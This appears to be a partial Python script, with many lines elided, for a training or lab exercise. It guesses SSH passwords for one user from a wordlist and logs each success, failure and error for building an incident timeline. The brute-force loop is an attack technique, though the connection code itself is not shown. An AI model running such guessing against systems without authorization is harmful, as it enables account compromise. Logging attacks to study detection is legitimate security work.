...
# Scripted SSH password guessing against a target, using a small wordlist, with
# full timestamped logging so each attempt maps cleanly into the incident timeline.
#
...
def main():
    ...
    log(f"[Attk101] Brute Force START | target={args.target}:{args.port} user={args.user} "
    ...
    for i, pw in enumerate(words, 1):
        ...
        try:
            ...
            log(f"[Attk101] SUCCESS attempt={i} user={args.user} credential_valid=true")
            hits += 1
            client.close()
            break  # one valid cred is enough for the demo
        except paramiko.AuthenticationException:
            log(f"[Attk101] FAIL attempt={i} user={args.user}")
        except Exception as e:
            log(f"[Attk101] ERROR attempt={i} err={type(e).__name__}: {e}")
        finally:
            try: client.close()
            except: pass
        time.sleep(args.delay)

    log(f"[Attk101] Brute Force END | target={args.target} attempts={len(words)} valid={hits}")
